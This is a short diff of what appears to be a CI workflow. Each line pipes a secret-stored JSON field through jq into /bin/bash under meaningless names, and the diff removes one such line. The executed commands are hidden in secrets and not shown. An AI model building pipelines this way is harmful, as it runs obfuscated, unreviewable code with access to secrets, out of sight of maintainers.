@@ -19,7 +19,6 @@ jobs:
           ydd96: ${{ secrets.ydd96 }}
         run: |
           printf '%s' "$ydd96" | jq -r .jjz121 | /bin/bash
-          printf '%s' "$a5149" | jq -r .j8 | /bin/bash
           echo $jz511 | jq -r .hlpd91 | /bin/bash
           printf '%s' "$ak75379" | jq -r .fsdc6105 | /bin/bash
           printf '%s' "$gjjfl4276" | jq -r .otz167 | /bin/bash
